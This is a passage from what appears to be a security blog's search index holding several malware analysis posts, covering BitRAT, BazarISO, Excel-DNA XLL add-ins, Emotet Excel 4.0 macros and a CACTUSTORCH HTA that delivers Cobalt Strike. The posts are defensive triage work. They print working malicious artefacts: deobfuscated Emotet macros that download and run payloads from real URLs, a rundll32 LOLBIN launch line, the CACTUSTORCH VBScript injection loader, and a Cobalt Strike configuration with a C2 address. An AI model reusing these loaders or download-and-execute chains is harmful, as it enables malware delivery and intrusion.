ddos_stop0x33abd0:$s10: socks5_srv_start0x33adb8:$s16: klg|0x3399ec:$s17: Slowloris0x33ac60:$s18: Bot ID:0x33b198:$t1: &amp;lt;sz&amp;gt;N/A&amp;lt;/sz&amp;gt;The exact rule it hits on is below:rule MALWARE_Win_BitRAT { meta: author = &quot;ditekSHen&quot; description = &quot;Detects BitRAT RAT&quot; clamav_sig = &quot;MALWARE.Win.Trojan.BitRAT&quot; strings: $s1 = &quot;\\\\plg\\\\&quot; fullword ascii $s2 = &quot;klgoff_del&quot; fullword ascii $s3 = &quot;files_delete&quot; ascii $s4 = &quot;files_zip_start&quot; fullword ascii $s5 = &quot;files_exec&quot; fullword ascii $s6 = &quot;drives_get&quot; fullword ascii $s7 = &quot;srv_list&quot; fullword ascii $s8 = &quot;con_list&quot; fullword ascii $s9 = &quot;ddos_stop&quot; fullword ascii $s10 = &quot;socks5_srv_start&quot; fullword ascii $s11 = &quot;/getUpdates?offset=&quot; fullword ascii $s12 = &quot;Action: /dlex&quot; fullword ascii $s13 = &quot;Action: /clsbrw&quot; fullword ascii $s14 = &quot;Action: /usb&quot; fullword ascii $s15 = &quot;/klg&quot; fullword ascii $s16 = &quot;klg|&quot; fullword ascii $s17 = &quot;Slowloris&quot; fullword ascii $s18 = &quot;Bot ID:&quot; ascii $t1 = &quot;&amp;lt;sz&amp;gt;N/A&amp;lt;/sz&amp;gt;&quot; fullword ascii $t2 = &quot;&amp;lt;silent&amp;gt;N/A&amp;lt;/silent&amp;gt;&quot; fullword ascii condition: uint16(0) == 0x5a4d and (7 of ($s*) or (4 of ($s*) and 1 of ($t*)))}Now we’ve identified the payload as BitRAT using YARA from a source that is fairly reputable and used in VirusTotal’s crowdsourced rules feature. If you want more details on the malware you can throw it into a sandbox to extract details and indicators.Injection is Commonplace NowLooping back on the subject of injection, I want to reiterate that injection is incredibly common. Crypter products and services like HCrypt and Snip3 provide ready-made encryption functionality for adversaries to simply check boxes and execute. For injection, these crypters are going to work in a similar method:Deploy injector -&amp;gt; Spawn process -&amp;gt; Inject byte array into processThe differences between the crypters are simply the implementation details. For Snip3, I’ve seen samples where the crypter delivers its injector component in obfuscated C# code and then compiles it at runtime for injection. In cases like Aggah malware threats, I’ve seen more samples that look like HCrypt where we have two binaries encoded in the same script. Injection isn’t just for fancy stuff anymore, it’s trivial for adversaries to implement.Thanks for reading!" }, { "title": "BazarISO Analysis - Loading with Advpack.dll", "url": "/bazariso-analysis-advpack/", "categories": "malware", "tags": "malware, bazariso, advpack", "date": "2022-01-22 00:00:00 +0000", "snippet": "Malware comes in all shapes and sizes, and in the case of BazarISO it comes in the form of an ISO file that contains a malicious shortcut and an executable. In this post I’ll tear apart the ISO to show how one of the more recent BazarISO samples works. If you want to follow along at home, I’m using the sample from MalwareBazaar here: https://bazaar.abuse.ch/sample/38cf92de5c97f9f79ddfb5632ac92f2670f3aa25414943735ddbe24507ad49f3/Triage and Unpack the ISOFirst, let’s make sure the file is an ISO with file.remnux@remnux:~/cases/bazariso$ file Documents-17.iso Documents-17.iso: ISO 9660 CD-ROM filesystem data &#39;&#39;Alright, let’s take a stab at unpacking with 7z.remnux@remnux:~/cases/bazariso$ 7z x Documents-17.iso 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz (806EA),ASM,AES-NI)Scanning the drive for archives:1 file, 743424 bytes (726 KiB)Extracting archive: Documents-17.iso--Path = Documents-17.isoType = IsoPhysical Size = 743424Created = 2022-01-21 09:15:47Everything is Ok Files: 2Size: 689865Compressed: 743424And 7-zip gave us the very life-affirming message that Everything is OK since both files in the ISO unpacked properly. Let’s see what files we have.remnux@remnux:~/cases/bazariso$ ls -lahtotal 1.4Mdrwxrwxr-x 2 remnux remnux 4.0K Jan 22 17:44 .drwxrwxr-x 10 remnux remnux 4.0K Jan 22 17:24 ..-rw-rw-r-- 1 remnux remnux 673K Jan 21 09:15 autorun.exe-rw-rw-r-- 1 remnux remnux 1.2K Jan 21 09:15 docs.lnk-rw-r--r-- 1 remnux remnux 726K Jan 22 2022 Documents-17.isoIt looks like the ISO contained two files, an autorun.exe and a docs.lnk file.Inspecting the LNK FileThinking through the chain of actions a victim is likely to take, the victim will try to double-click the ISO file and Windows will mount it as a removable drive. The victim then will click either autorun.exe or docs.lnk. Shortcut LNK files often contain shady material because they allow a creator to specify command line arguments in the shortcut to perform arbitrary actions. We can triage this file and analyze it using file and exiftool.remnux@remnux:~/cases/bazariso$ file docs.lnk docs.lnk: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has command line arguments, Icon number=5, Archive, ctime=Mon Dec 27 02:31:16 2021, mtime=Fri Jan 21 17:35:47 2022, atime=Mon Dec 27 02:31:16 2021, length=71680, window=hideremnux@remnux:~/cases/bazariso$ exiftool docs.lnk ExifTool Version Number : 12.30File Name : docs.lnkDirectory : .File Size : 1225 bytesFile Modification Date/Time : 2022:01:21 09:15:47-05:00File Access Date/Time : 2022:01:22 17:51:01-05:00File Inode Change Date/Time : 2022:01:22 17:42:19-05:00File Permissions : -rw-rw-r--File Type : LNKFile Type Extension : lnkMIME Type : application/octet-streamFlags : IDList, LinkInfo, RelativePath, CommandArgs, IconFile, Unicode, TargetMetadataFile Attributes : ArchiveCreate Date : 2021:12:26 16:31:16-05:00Access Date : 2022:01:21 07:35:47-05:00Modify Date : 2021:12:26 16:31:16-05:00Target File Size : 71680Icon Index : 5Run Window : NormalHot Key : (none)Target File DOS Name : rundll32.exeDrive Type : Fixed DiskVolume Label : Local Base Path : C:\\Windows\\System32\\rundll32.exeRelative Path : ..\\Windows\\System32\\rundll32.exeCommand Line Arguments : advpack.dll,RegisterOCX autorun.exeIcon File Name : %systemroot%\\system32\\imageres.dllMachine ID : desktop-i8bn9qkAlright we definitely have a LNK shortcut file! Inspecting with exiftool it looks like the shortcut is fairly small at 1225 bytes. Larger shortcut files may indicate very large PowerShell or scripting command line properties. In this case, it looks like the command the shortcut executes is C:\\Windows\\System32\\rundll32.exe advpack.dll,RegisterOCX autorun.exe. This command is a way to execute autorun.exeusing rundll32.exe as a LOLBIN. The icon is one from a default Windows installation, but some LNK files I’ve seen have had ones distributed with the files as well. The last bit of detail in this output is the Machine ID. This property shows the computer name of the system that created the shortcut. So, the adversary either created this shortcut on a system named desktop-i8bn9qk or knows how to modify the shortcut file to that name.Triage and Estimate CapabilitiesAlright, let’s see if we can estimate some of the capabilities of the autorun.exe binary using capa and yara.remnux@remnux:~/cases/bazariso$ capa autorun.exe +------------------------+------------------------------------------------------------------------------------+| md5 | 6d583d7666ffbc439f86f8954cc3e0ec || sha1 | d17ff6f48a3e3693ee61b79341ed282087df2e71 || sha256 | 667753d0c33cf7874b3d4cf05be4cf245558515e73330e133c60da63554471d8 || path | autorun.exe |+------------------------+------------------------------------------------------------------------------------++------------------------+------------------------------------------------------------------------------------+| ATT&amp;amp;CK Tactic | ATT&amp;amp;CK Technique ||------------------------+------------------------------------------------------------------------------------|| COLLECTION | Input Capture::Keylogging T1056.001 || DEFENSE EVASION | Modify Registry:: T1112 || | Obfuscated Files or Information:: T1027 || | Obfuscated Files or Information::Indicator Removal from Tools T1027.005 || DISCOVERY | File and Directory Discovery:: T1083 || | Query Registry:: T1012 || | System Information Discovery:: T1082 || EXECUTION | Shared Modules:: T1129 |+------------------------+------------------------------------------------------------------------------------++-----------------------------+-------------------------------------------------------------------------------+| MBC Objective | MBC Behavior ||-----------------------------+-------------------------------------------------------------------------------|| COLLECTION | Keylogging::Polling [F0002.002] || DATA | Encode Data::XOR [C0026.002] || DEFENSE EVASION | Obfuscated Files or Information::Encoding-Standard Algorithm [E1027.m02] || DISCOVERY | Application Window Discovery::Window Text [E1010.m01] || FILE SYSTEM | Delete File:: [C0047] || | Read File:: [C0051] || | Writes File:: [C0052] || OPERATING SYSTEM | Environment Variable::Set Variable [C0034.001] || | Registry::Create Registry Key [C0036.004] || | Registry::Delete Registry Key [C0036.002] || | Registry::Open Registry Key [C0036.003] || | Registry::Query Registry Value [C0036.006] || | Registry::Set Registry Key [C0036.001] || PROCESS | Set Thread Local Storage Value:: [C0041] || | Terminate Process:: [C0018] |+-----------------------------+-------------------------------------------------------------------------------++------------------------------------------------------+------------------------------------------------------+| CAPABILITY | NAMESPACE ||------------------------------------------------------+------------------------------------------------------|| log keystrokes via polling | collection/keylog || encode data using XOR (2 matches) | data-manipulation/encoding/xor || contain a resource (.rsrc) section | executable/pe/section/rsrc || extract resource via kernel32 functions (8 matches) | executable/resource || query environment variable | host-interaction/environment-variable || set environment variable | host-interaction/environment-variable || get common file path | host-interaction/file-system || delete file | host-interaction/file-system/delete || enumerate files via kernel32 functions (2 matches) | host-interaction/file-system/files/list || get file size | host-interaction/file-system/meta || read .ini file (2 matches) | host-interaction/file-system/read || read file | host-interaction/file-system/read || write file (2 matches) | host-interaction/file-system/write || get graphical window text | host-interaction/gui/window/get-text || get disk information | host-interaction/hardware/storage || set thread local storage value | host-interaction/process || terminate process | host-interaction/process/terminate || query or enumerate registry value (3 matches) | host-interaction/registry || set registry value | host-interaction/registry/create || delete registry key (2 matches) | host-interaction/registry/delete || access PEB ldr_data (3 matches) | linking/runtime-linking || link function at runtime (15 matches) | linking/runtime-linking || resolve function by hash (2 matches) | linking/runtime-linking || parse PE exports (3 matches) | load-code/pe || parse PE header (10 matches) | load-code/pe |+------------------------------------------------------+------------------------------------------------------+From the capa output there are already some capabilities in here that will likely increase analysis time. These include: access PEB ldr_data link function at runtime resolve function by hashThe PEB ldr_data rule indicates the binary contains some assembly instructions that resolve DLL module lists from the process environment block of the process while it is running. This is a method used by shellcode to resolve DLL imports and pain-in-the-can malware to hide their imports. Linking functions at runtime means the sample likely issues LoadLibrary() or similar calls to import DLLs at runtime instead of when the program first runs. Finally, resolving functions by hash means it’ll be a hassle to potentially see what functions are being resolved as they’ll be hashed strings rather than the clear strings. Let’s see what we get from YARA.remnux@remnux:~/cases/bazariso$ yara-rules autorun.exe Check_OutputDebugStringA_iat autorun.exeanti_dbg autorun.exewin_hook autorun.exescreenshot autorun.exekeylogger autorun.exewin_registry autorun.exewin_files_operation autorun.exeIsPE64 autorun.exeIsWindowsGUI autorun.exeHasRichSignature autorun.exeMicrosoft_Visual_Cpp_80_DLL autorun.exeYARA thinks the sample has some anti-debugging, so that might become a hassle while doing further analysis later. From here my analysis style would be to toss this sucker into a sandbox to see what it does because further analysis is going to produce diminishing returns for me.Thanks for reading!" }, { "title": "Extracting Payloads from Excel-DNA XLL Add-Ins", "url": "/extracting-payloads-excel-dna-xlls/", "categories": "malware", "tags": "malware, xll, excel-dna", "date": "2022-01-18 00:00:00 +0000", "snippet": "A few different malware families have included Excel XLL add-in files as distribution mechanisms lately. These include IcedID and some commodity threats that HP’s security team documented as using Excel-DNA. In this post, I’ll show how you can extract payloads from XLL files created using Excel-DNA. If you want to play along at home, the sample I’m using is in MalwareBazaar here: https://bazaar.abuse.ch/sample/876b4427b613ceebe5a4fa5a8d15e2d9473756c697db0c526dc84eb9bc7a3149/Triaging the FileAs usual, let’s make sure we’re looking at a XLL file. A typical XLL file is a Windows DLL that contains particular exports. We can verify the file contents with file.remnux@remnux:~/cases/formbook-xll$ file balance.xll balance.xll: PE32 executable (DLL) (GUI) Intel 80386, for MS WindowsAlright, we definitely have a DLL file. Now let’s take a look at the DLL exports with pedump.remnux@remnux:~/cases/formbook-xll$ pedump --exports balance.xll=== EXPORTS ===# module &quot;Excel-Dna.xll&quot;# flags=0x0 ts=&quot;2106-02-07 06:28:15&quot; version=0.0 ord_base=1# nFuncs=10014 nNames=10014 ORD ENTRY_VA NAME 1 3e7a0 CalculationCanceled 2 3e780 CalculationEnded 3 3e830 DllCanUnloadNow 4 3e840 DllGetClassObject 5 3e8c0 DllRegisterServer 6 3e8a0 DllUnregisterServer 7 3e7c0 RegistrationInfo 8 3e8e0 SetExcel12EntryPt 9 3e7f0 SyncMacro a 3e770 f0 ... 271a 3e900 xlAddInManagerInfo12 271b 3ea60 xlAutoClose 271c 3ea10 xlAutoFree12 271d 3eb60 xlAutoOpen 271e 3ea30 xlAutoRemoveThis DLL has a LOT of exports. I trimmed quite a few from the output so we can get the good stuff here, and it looks like we do have some exports expected for XLLs: xlAddInManagerInfo12 xlAutoOpen xlAutoClose xlAutoRemoveAlrighty then, it looks like we have a XLL file! Moving on, let’s learn a little bit about Excel-DNA XLL files.Extracting from Excel-DNA In a NutshellExcel-DNA is a legitimate software project that allows developers to implement .NET code in Excel Add-ins. This is achieved using a “loader” component that extracts and executes a compressed assembly. Let’s take a look at the resources for this sample with pedump.remnux@remnux:~/cases/formbook-xll$ pedump --resources balance.xll === RESOURCES ===FILE_OFFSET CP LANG SIZE TYPE NAME 0x6ed38 1252 0 47104 ASSEMBLY EXCELDNA.MANAGEDHOST 0x7a538 1252 0 259271 ASSEMBLY_LZMA CUSTOMER 0xb9a00 1252 0 71766 ASSEMBLY_LZMA EXCELDNA.INTEGRATION 0xcb258 1252 0 43706 ASSEMBLY_LZMA EXCELDNA.LOADER 0xd5d14 1252 0 530 DNA __MAIN__ 0xd5f28 1252 0x409 64 STRING #7 0xd5f68 1252 0x409 3570 STRING #8 0xd6d5c 1252 0x409 3494 STRING #9 0xd7b04 1252 0x409 3080 STRING #10 0xd870c 1252 0x409 980 VERSION #1There are a few different resources that stand out. The ones that contain the string EXCELDNA in their names are likely overhead from the Excel-DNA project. I’m already suspicious of the one named CUSTOMER, especially with it weighing in at ~250 KiB. Let’s extract that using pedump!remnux@remnux:~/cases/formbook-xll$ pedump --extract resource:ASSEMBLY_LZMA/CUSTOMER balance.xll &amp;gt; CUSTOMER.datremnux@remnux:~/cases/formbook-xll$ file CUSTOMER.dat CUSTOMER.dat: LZMA compressed data, non-streamed, size 1214464Sweet, we now have a chunk of LZMA-compressed data. To decompress it, we can use 7z.remnux@remnux:~/cases/formbook-xll$ 7z x CUSTOMER.datScanning the drive for archives:1 file, 259271 bytes (254 KiB)Extracting archive: CUSTOMER.dat--Path = CUSTOMER.datType = lzmaEverything is OkSize: 1214464Compressed: 259271remnux@remnux:~/cases/formbook-xll$ file CUSTOMERCUSTOMER: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS WindowsAnd now we have a .NET assembly we can decompile further with ilspycmd if desired. That’s an exercise unto itself, so I’m quitting here for the day. Thanks for reading!" }, { "title": "Emotet&#39;s Excel 4.0 Macros Dropping DLLs", "url": "/emotet-excel4-macro-analysis/", "categories": "malware", "tags": "malware, emotet, excel4-macro", "date": "2022-01-17 00:00:00 +0000", "snippet": "It’s been a little while since I checked in on Emotet to see how its first stage loaders are doing. Lately the first stage has been using Excel 4.0 macros to drop payloads, so in this post I’ll walk through the analysis of one Emotet Excel document. If you want to play along at home, I’m working with this sample in MalwareBazaar: https://bazaar.abuse.ch/sample/1a243db583013a6999761dad88d6952351fdc2cd17d2016990276a9dd11ac90b/Triaging the FileAs always, we should confirm our filetype first. Let’s give it a go using file, xxd, and head.remnux@remnux:~/cases/emotet$ file nn30.xlsm nn30.xlsm: Microsoft Excel 2007+remnux@remnux:~/cases/emotet$ xxd nn30.xlsm | head00000000: 504b 0304 1400 0600 0800 0000 2100 a78b PK..........!...00000010: 2b33 c901 0000 9707 0000 1300 0802 5b43 +3............[C00000020: 6f6e 7465 6e74 5f54 7970 6573 5d2e 786d ontent_Types].xm00000030: 6c20 a204 0228 a000 0200 0000 0000 0000 l ...(..........00000040: 0000 0000 0000 0000 0000 0000 0000 0000 ................00000050: 0000 0000 0000 0000 0000 0000 0000 0000 ................00000060: 0000 0000 0000 0000 0000 0000 0000 0000 ................00000070: 0000 0000 0000 0101 0000 0000 0000 0000 ................00000080: 0000 0000 0000 0000 0000 0000 0000 0000 ................00000090: 0000 0000 0000 0000 0000 0000 0000 0000 ................The file output says the file magic belongs to a Excel document, and the first few bytes are what I’d expect from an Excel document. The PK part of the magic is common to zip archives as well and Excel XLSX documents are similar to zip archives. The string [Content Types].xml refers to the filename of one of the XML files that make up a larger Excel document. If you unzip a XLSX file, you’ll find one of those files in the extracted content. All told, this is consistent with an Excel doc.Analyzing the DocumentA good starting point for the analysis is olevba.remnux@remnux:~/cases/emotet$ olevba nn30.xlsm olevba 0.60 on Python 3.8.10 - http://decalage.info/python/oletools===============================================================================FILE: nn30.xlsmType: OpenXML-------------------------------------------------------------------------------VBA MACRO xlm_macro.txt in file: xlm_macro - OLE stream: &#39;xlm_macro&#39;- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &#39; RAW EXCEL4/XLM MACRO FORMULAS:&#39; SHEET: EWDFFEFAD, Macrosheet&#39; CELL:E13, =FORMULA(Srieifew1!E2,E16)=FORMULA(Buuk1!P22&amp;amp;Buuk1!H9&amp;amp;Buuk1!L2&amp;amp;Buuk1!B15&amp;amp;Buuk1!B15&amp;amp;Srieifew1!B10&amp;amp;Srieifew1!D6&amp;amp;Srieifew1!F9&amp;amp;Srieifew1!G15&amp;amp;Srieifew1!P20&amp;amp;Srieifew1!K5,E18)=FORMULA(Buuk1!P22&amp;amp;Buuk1!J11&amp;amp;Buuk1!B18&amp;amp;Buuk1!P11&amp;amp;&quot;YHYH&quot;&amp;amp;Buuk1!P9&amp;amp;Buuk1!K9&amp;amp;Buuk1!P7&amp;amp;Buuk1!P19&amp;amp;Buuk1!H9&amp;amp;Buuk1!L2&amp;amp;Buuk1!B15&amp;amp;Buuk1!B15&amp;amp;Srieifew1!B10&amp;amp;Srieifew1!D6&amp;amp;Srieifew1!F9&amp;amp;Srieifew1!S11&amp;amp;Srieifew1!P20&amp;amp;Srieifew1!K5&amp;amp;Buuk1!P13,E20)=FORMULA(Buuk1!P22&amp;amp;Buuk1!J11&amp;amp;Buuk1!B18&amp;amp;Buuk1!P11&amp;amp;&quot;YHYH1&quot;&amp;amp;Buuk1!P9&amp;amp;Buuk1!K9&amp;amp;Buuk1!P7&amp;amp;Buuk1!P19&amp;amp;Buuk1!H9&amp;amp;Buuk1!L2&amp;amp;Buuk1!B15&amp;amp;Buuk1!B15&amp;amp;Srieifew1!B10&amp;amp;Srieifew1!D6&amp;amp;Srieifew1!F9&amp;amp;Srieifew1!D18&amp;amp;Srieifew1!P20&amp;amp;Srieifew1!K5&amp;amp;Buuk1!P13,E22)=FORMULA(Buuk1!P22&amp;amp;Buuk1!J11&amp;amp;Buuk1!B18&amp;amp;Buuk1!P11&amp;amp;&quot;YHYH2&quot;&amp;amp;Buuk1!P9&amp;amp;Buuk1!K9&amp;amp;Buuk1!P7&amp;amp;Buuk1!H9&amp;amp;Buuk1!B15&amp;amp;Buuk1!I17&amp;amp;Buuk1!I3&amp;amp;Buuk1!H13&amp;amp;Buuk1!P11&amp;amp;Buuk1!K9&amp;amp;Buuk1!P13&amp;amp;Buuk1!P7&amp;amp;Buuk1!P13,E24)=FORMULA(Buuk1!P22&amp;amp;Buuk1!H13&amp;amp;Buuk1!N4&amp;amp;Buuk1!H13&amp;amp;Buuk1!H9&amp;amp;Buuk1!P11&amp;amp;Buuk1!P15&amp;amp;Buuk1!H9&amp;amp;Buuk1!P20&amp;amp;Srieifew1!O14&amp;amp;Srieifew1!Q3&amp;amp;Srieifew1!N9&amp;amp;Srieifew1!O5&amp;amp;Buuk1!P15&amp;amp;Buuk1!P17&amp;amp;&quot;YHYH6&quot;&amp;amp;Buuk1!P13,E26)=FORMULA(Buuk1!P22&amp;amp;Buuk1!G24&amp;amp;Buuk1!H13&amp;amp;Buuk1!I26&amp;amp;Buuk1!E11&amp;amp;Buuk1!G24&amp;amp;Buuk1!K23&amp;amp;Buuk1!P11&amp;amp;Buuk1!P13,E32), 0&#39; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &#39; EMULATION - DEOBFUSCATED EXCEL4/XLM MACRO FORMULAS:&#39; CELL:E13 , FullEvaluation , False&#39; CELL:E18 , FullEvaluation , CALL(&quot;urlmon&quot;,&quot;URLDownloadToFileA&quot;,&quot;JJCCBB&quot;,0,&quot;hxxps://zml.laneso.com/packet/AlvJ8OdtSYEeeCQP/&quot;,&quot;..\\erum.ocx&quot;,0,0)&#39; CELL:E20 , FullEvaluation , IF(YHYH&amp;lt;0,CALL(&quot;urlmon&quot;,&quot;URLDownloadToFileA&quot;,&quot;JJCCBB&quot;,0,&quot;hxxp://ostadsarma.com/wp-admin/JNgASjNC/&quot;,&quot;..\\erum.ocx&quot;,0,0))&#39; CELL:E22 , FullEvaluation , IF(YHYH1&amp;lt;0,CALL(&quot;urlmon&quot;,&quot;URLDownloadToFileA&quot;,&quot;JJCCBB&quot;,0,&quot;hxxp://govtjobresultbd.xyz/sjjz/UIUhOHsLqjOy9/&quot;,&quot;..\\erum.ocx&quot;,0,0))&#39; CELL:E24 , FullEvaluation , IF(YHYH2&amp;lt;0,CLOSE(0),)&#39; CELL:E26 , PartialEvaluation , =EXEC(&quot;C:\\Windows\\SysWow64\\rundll32.exe ..\\erum.ocx,D&quot;&quot;&amp;amp;&quot;&quot;l&quot;&quot;&amp;amp;&quot;&quot;lR&quot;&quot;&amp;amp;&quot;&quot;egister&quot;&quot;&amp;amp;&quot;&quot;Serve&quot;&quot;&amp;amp;&quot;&quot;r&quot;)&#39; CELL:E32 , FullEvaluation , RETURN()+----------+--------------------+---------------------------------------------+|Type |Keyword |Description |+----------+--------------------+---------------------------------------------+|Suspicious|CALL |May call a DLL using Excel 4 Macros (XLM/XLF)||Suspicious|Windows |May enumerate application windows (if || | |combined with Shell.Application object) ||Suspicious|URLDownloadToFileA |May download files from the Internet ||Suspicious|EXEC |May run an executable file or a system || | |command using Excel 4 Macros (XLM/XLF) ||Suspicious|Base64 Strings |Base64-encoded strings were detected, may be || | |used to obfuscate strings (option --decode to|| | |see all) ||IOC |hxxps://zml.laneso.c|URL || |om/packet/AlvJ8OdtSY| || |EeeCQP/ | ||IOC |hxxp://ostadsarma.co|URL || |m/wp-admin/JNgASjNC/| ||IOC |hxxp://govtjobresult|URL || |bd.xyz/sjjz/UIUhOHsL| || |qjOy9/ | ||IOC |rundll32.exe |Executable file name ||Suspicious|XLM macro |XLM macro found. It may contain malicious || | |code |+----------+--------------------+---------------------------------------------+Interpreting the output, it looks like the document has Excel 4.0 macros that download content from these URLs: hxxps://zml.laneso[.]com/packet/AlvJ8OdtSYEeeCQP/ hxxp://ostadsarma[.]com/wp-admin/JNgASjNC/ hxxp://govtjobresultbd[.]xyz/sjjz/UIUhOHsLqjOy9/And using the URLDownloadToFileA function from urlmon.dll, the document saved the downloaded content to erum.ocx.Afterward, the document proceeded to execute C:\\Windows\\SysWow64\\rundll32.exe ..\\erum.ocx,D&quot;&amp;amp;&quot;l&quot;&amp;amp;&quot;lR&quot;&amp;amp;&quot;egister&quot;&amp;amp;&quot;Serve&quot;&amp;amp;&quot;r. The obfuscation on the DLL export reduces down to DllRegisterServer. So the process ancestry becomes excel.exe -&amp;gt; rundll32.exe erum.ocx,DllRegisterServer.We can confirm this by looking at a sandbox report from Tria.ge here: https://tria.ge/220115-mqldpsdhb7/behavioral1.Thanks for reading!" }, { "title": "Analyzing a CACTUSTORCH HTA Leading to Cobalt Strike", "url": "/analyzing-cactustorch-hta-cobaltstrike/", "categories": "Malware", "tags": "malware, hta, cobalt-strike", "date": "2022-01-16 00:00:00 +0000", "snippet": "There are loads of different ways adversaries can distribute Cobalt Strike beacons and other malware. One of the common methods includes using HTML Application (HTA) files. In this post I’m going to look at a malicious HTA file created using CACTUSTORCH and designed to distribute a Cobalt Strike beacon. If you want to follow along at home, the sample is in MalwareBazaar here: https://bazaar.abuse.ch/sample/4d4d70e1918494a0a39641bd8dbfc23ae6451f3d20396b43f150623b8cfe4e93/Triaging the FileMalwareBazaar tags say the file is a HTA, and we can use file and head to confirm this.remnux@remnux:~/cases/hta-cs$ file 1234.hta 1234.hta: HTML document, ASCII text, with very long lines, with CRLF line terminatorsremnux@remnux:~/cases/hta-cs$ head -c 100 1234.hta &amp;lt;script language=&quot;VBScript&quot;&amp;gt;Dim binary : binary = &quot;notepad.exe&quot;Dim code : code = &quot;TVroAAAAAFuJ31Alrighty then, it looks like file thinks the sample is a HTML document (containing HTML tags). The head command shows us the first 100 bytes here, and it looks like the file does contain at least one script HTML tag.Let’s take a look at the content!Analyzing the HTA ContentI’ve included the contents of the HTA below, truncating a lot of base64 code that was included so we can see the good stuff.&amp;lt;script language=&quot;VBScript&quot;&amp;gt;Dim binary : binary = &quot;notepad.exe&quot;Dim code : code = &quot;TVroAAAAAFuJ31J...&quot;Sub Debug(s)End SubSub SetVersionEnd SubFunction Base64ToStream(b) Dim enc, length, ba, transform, ms Set enc = CreateObject(&quot;System.Text.ASCIIEncoding&quot;) length = enc.GetByteCount_2(b) Set transform = CreateObject(&quot;System.Security.Cryptography.FromBase64Transform&quot;) Set ms = CreateObject(&quot;System.IO.MemoryStream&quot;) ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length / 4) * 3) ms.Position = 0 Set Base64ToStream = msEnd FunctionSub RunDim s, entry_classs = &quot;AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy&quot;s = s &amp;amp; &quot;AwAAAAhEZWx...&quot;entry_class = &quot;cactusTorch&quot;Dim fmt, al, d, oSet fmt = CreateObject(&quot;System.Runtime.Serialization.Formatters.Binary.BinaryFormatter&quot;)Set al = CreateObject(&quot;System.Collections.ArrayList&quot;)al.Add fmt.SurrogateSelectorSet d = fmt.Deserialize_2(Base64ToStream(s))Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)o.flame binary,codeEnd SubSetVersionOn Error Resume NextRunIf Err.Number &amp;lt;&amp;gt; 0 Then Debug Err.Description Err.ClearEnd Ifself.close&amp;lt;/script&amp;gt;When looking at the sample there are a few things that stand out. First, there are two large chunks of base64 code in the file. The filesize of the HTA is around 287 KiB, which is really hefty for a text file. When you have plaintext files that large, we can usually assume there are obfuscation schemes or binary/shellcode content embedded. In this case, the strings and variable names are too neat and not scrambled, so obfuscation is out. The first base64 chunk starts with TVro, which decodes to a MZ header seen with Windows EXEs.The second big thing that stands out is binary = &quot;notepad.exe&quot;. This is a quick and simple indicator for our analysis. Process names like this in malicious code typically mean that the malicious binary content will be saved and executed as the process name or injected into a process of the same name. If the name is a legitimate Windows binary I tend to lean toward the latter case of injection.Finally, entry_class = &quot;cactusTorch&quot; is significant. This line of code leads us to the CACTUSTORCH project’s HTA template. CACTUSTORCH is a project to embed Cobalt Strike beacons into script content such as HTA and VBS files. Thankfully, the template gives us a head start on analysis. The second base64 chunk is static content and the first looks to be variable content containing the actual payload. With that in mind, let’s extract the payload.Decoding the PayloadTo decode the payload, we can place all the base64 content into its own file and then use the base64 -d command to get the cleartext payload.remnux@remnux:~/cases/hta-cs$ cat payload.b64 | base64 -d &amp;gt; payload.binremnux@remnux:~/cases/hta-cs$ file payload.bin payload.bin: MS-DOS executable PE32 executable (DLL) (GUI) Intel 80386, for MS Windowsremnux@remnux:~/cases/hta-cs$ md5sum payload.bin 86a7eaba09313ab6b4a01a5e6d573acc payload.binBy searching for the MD5 hash on VirusTotal we can see someone’s already reported the beacon executable content and a load of vendors detect it as Cobalt Strike. Let’s squeeze some more indicators from this beacon using 1768.py:remnux@remnux:~/cases/hta-cs$ 1768.py payload.bin File: payload.binpayloadType: 0x10014a34payloadSize: 0x00000000intxorkey: 0x00000000id2: 0x00000000Config found: xorkey b&#39;.&#39; 0x0002fe20 0x000330000x0001 payload type 0x0001 0x0002 0 windows-beacon_http-reverse_http0x0002 port 0x0001 0x0002 123420x0003 sleeptime 0x0002 0x0004 600000x0004 maxgetsize 0x0002 0x0004 10485760x0005 jitter 0x0001 0x0002 00x0006 maxdns 0x0001 0x0002 2550x0007 publickey 0x0003 0x0100 30819f300d06092a864886f70d010101050003818d00308189028181009352527b27bf73fcc92457cf8cb1894ebd1104da185d18dceb28f159d74958d0ae657a003eba6e49c44484682d30a0381298e1ab921d608b3fda43077ab46e268a1160a62d2821b7f0bba5d96c4ea08581b2bb617bf80e5389f454cef53460b5e32bbf045b5d978631f1e0aa29305fc0b4e02e786c1f888d83997c0dceb043bf0203010001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000x0008 server,get-uri 0x0003 0x0100 &#39;42.193.229.33,/j.ad&#39;0x0009 useragent 0x0003 0x0080 &#39;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)&#39;0x000a post-uri 0x0003 0x0040 &#39;/submit.php&#39;0x000b Malleable_C2_Instructions 0x0003 0x0100 Transform Input: [7:Input,4] Print0x000c http_get_header 0x0003 0x0100 Build Metadata: [7:Metadata,3,6:Cookie] BASE64 Header Cookie0x000d http_post_header 0x0003 0x0100 Const_header Content-Type: application/octet-stream Build SessionId: [7:SessionId,5:id] Parameter id Build Output: [7:Output,4] Print0x000e SpawnTo 0x0003 0x0010 (NULL ...)0x001d spawnto_x86 0x0003 0x0040 &#39;%windir%\\\\syswow64\\\\rundll32.exe&#39;0x001e spawnto_x64 0x0003 0x0040 &#39;%windir%\\\\sysnative\\\\rundll32.exe&#39;0x000f pipename 0x0003 0x0080 (NULL ...)0x001f CryptoScheme 0x0001 0x0002 00x0013 DNS_Idle 0x0002 0x0004 0 0.0.0.00x0014 DNS_Sleep 0x0002 0x0004 00x001a get-verb 0x0003 0x0010 &#39;GET&#39;0x001b post-verb 0x0003 0x0010 &#39;POST&#39;0x001c 